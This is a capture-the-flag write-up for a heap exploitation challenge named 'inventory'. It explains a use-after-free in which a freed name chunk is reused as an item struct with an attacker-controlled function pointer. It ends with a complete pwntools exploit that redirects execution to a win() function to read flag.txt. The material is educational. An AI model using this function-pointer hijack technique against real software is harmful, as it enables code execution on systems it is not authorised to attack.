# Challenge description #

You came across an inventory update server running at host1.metaproblems.com 5300 (you can connect using nc) while scanning the internal network. After locating the source and binary for service, you found that this server is implemented fairly well compared to what you've seen so far. However, after looking a bit closer into the code, you start to feel that something isn't quite right. Could you find out what's wrong with the program in order to exploit it and get the flag?

Please note that the remote server is running libc-2.28.so, though you do not need the libc to solve this challenge.


# analyzing the binary #
We are given both the binary and the source code. Let's go over the usual things. 

checksec tells us the following: 

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From glancing over the source code, we immediately notice there's a win() function:

```c
void win() {
	system("/bin/cat flag.txt");
	exit(0);
}
```

Since PIE is disabled, we know that this function is always at the same address (namely: `0x401203`)
Besides that, theres also a struct containing a function pointer:

```c
struct item {
	unsigned long price;
	char * itemname;
	void (*print_ptr)();
};
```

So it's safe to assume we probably need to hijack control flow somehow by corrupting this *print_ptr and point it to win(). 

# functionality #
By reading the source code, we learn that there are a couple of options presented to us: 

```c
void menu() {
	puts("===================");
	puts("1. Add an item.");
	puts("2. View an item.");
	puts("3. Remove an item.");
	puts("4. Assign a name to an item.");
	puts("5. Remove a name from an item.");
	puts("6. Submit the inventory.");
}
```

Each of these actions have their behaviour defined in their own functions:

### `add_item()` ###
```c
	struct item* newItem = (struct item*)malloc(sizeof(struct item));
	newItem->price = 0;
	newItem->itemname = NULL;
	itemlist[index] = newItem;
```

The add_item function basically calls malloc(24), sets the first 8 bytes (newItem->price) to 0 and then the next 8 bytes (newItem->itemname) to 0 too. After this it stores the pointer to the global itemlist[] array. 

### `view_item()` ### 

```c
	printf("Price: %ld\n", itemlist[select]->price);
	if(itemlist[select]->itemname != NULL) {
		printf("Item name: %s\n", itemlist[select]->itemname);
		(*(itemlist[select]->print_ptr))();
	}
```

View_item(), if the item exists, prints out its price and then checks if there is an itemname associated with this item. If there is an item, it executes the print_ptr() stored in the item. 

### `assign_name()` ###

```c
        [...]
        char * newname = (char *)malloc(0x18);
		puts("Enter the item name: ");
		fgets(newname, 0x18, stdin);
		itemlist[select]->itemname = newname;
		if(strstr(newname, "wheel") != NULL) {
			itemlist[select]->print_ptr = &print_wheel;
			itemlist[select]->price = 50;
		}
		else if(strstr(newname, "oil") != NULL) {
			itemlist[select]->print_ptr = &print_oil;
			itemlist[select]->price = 25;
		}
        [...]
```

This function also calls malloc(24) but this time, it reads 24 bytes of our input and stores it in the heap chunk. If our input doesnt equal "wheel" or "oil", it does not explicitly set the print_ptr to anything. 

### `remove_name()` ###
```c
		free(itemlist[select]->itemname);
		itemlist[select]->itemname = NULL;
		itemlist[select]->price = 0;
		itemlist[select]->print_ptr = NULL;
```

This function frees the itemname from any item, if it exists.


## to recap ##
- add_item(0)       ptr_0 = malloc(24)
- remove_item(0)    free(ptr_0)
- 


# Use After Free #
This application is vulnerable to a so called `use-after-free`.

The way heap allocations work is that, malloc() returns a pointer to a heap chunk. If this heap chunk is freed, it gets placed into a LIFO cache. To understand whats happening consider the following code:
```
ptr_0 = malloc(24)      # returns ptr to chunk_0 of size 24 at address 0x420
free(ptr_0)             # libc caches the chunk at address 0x420 
ptr_1 = malloc(24)      # returns ptr to chunk_0 again at address 0x420 since it's the first available free chunk of size 24.
```

In this above code, ptr_0 and ptr_1 refer to the same memory area at address 0x420.

The reason this is important is because we have two different ways of allocating a chunk of size 24, and one of them, `assign_name()` lets us controll the full contents of this chunk. 

In theory, this would allow us to create a chunk with 24 bytes of our controlled content, for example, a `name chunk` could contain the following content: 

```
AAAAAAAABBBBBBBBCCCCCCCC
```

If we then free this `name chunk` it gets cached and we could then use the add_item() so the free'd name chunk with our controlled content gets used as an `item struct`, we're effectively re-using our free'd chunk. 

# Exploitation Strategy # 
To recap and visualize the previous, lets consider the following usage of the application: 

1. we add an item at index 0, called item_0, this will create a heap chunk called chunk_0 of size 24
2. we assign a name to item_0, this will allocate chunk_1 of size 24, we fully control the content of this chunk and send the name `AAAAAAAABBBBBBBBCCCCCCCC`
3. we free the name of item_0, so we free chunk_1, this will cause a chunk with the contents of `AAAAAAAABBBBBBBBCCCCCCCC` to be inserted into the libc heap cache.
4. we add a second item at index 1, called item_1, this will re-use the previously free'd chunk with contents of `AAAAAAAABBBBBBBBCCCCCCCC`. Looking back on the code of add_item() 
    ```c
        struct item* newItem = (struct item*)malloc(sizeof(struct item));
        newItem->price = 0;
        newItem->itemname = NULL;
        itemlist[index] = newItem;
    ```

    We see that only the price and itemname (the first 16 bytes) get    nulled out, so our item_1 will contain the following contents: 

    ```
    [
        0x0000000000000000  # item->price
        0x0000000000000000  # item->itemname
        0x4343434343434343  # item->print_ptr
    ]
    ```

5. now that we have an item_1 with a corrupted print_ptr, we need to actually call the print_ptr through view_item.
```
	if(itemlist[select]->itemname != NULL) {
		printf("Item name: %s\n", itemlist[select]->itemname);
		(*(itemlist[select]->print_ptr))();
	}
```
Our pointer will only be called / executed if we pass the `itemlist[select]->itemname != NULL`, this simply means we have to add a name to our item_1. In order to do this, we simply call assign_name() again with index 1 so a fresh chunk of 24 bytes gets assigned to item_1->itemname. 

6. We can now call view_item(1) and have our corrupted `item_1->print_ptr()` executed. 


# Exploit # 
```python
#!/usr/bin/env python3 
from pwn import *

def add_item(r):
    r.recvuntil(b"> ")
    r.sendline(b"1")

def assign_name(r, index, name):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.sendline(str(index).encode())
    r.sendline(name)
    r.sendlineafter(b"Unknown item type. Please enter the price manually\n", b"1337")

def remove_name(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"5")
    r.sendline(str(index).encode())

def view_item(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.sendline(str(index).encode())


r = process("./inventory")
#r = remote("host1.metaproblems.com", 5300)

e = ELF("./inventory")
fake_struct = b"".join(p64(x) for x in [
    0x4141414141414141, # price
    0x4242424242424242, # name ptr
    e.symbols['win'],   # function ptr
])

# create item_0
add_item(r)
# add name to item_0 which contains our faked struct
assign_name(r, 0, fake_struct)
# free name so it ends up in cache
remove_name(r, 0)
# add a new item which reuses our faked struct chunk
add_item(r)
# add a name so itemlist[select]->itemname != NULL passes
assign_name(r, 1, b"PogChamp")
# trigger function call
view_item(r, 1)

r.interactive()

```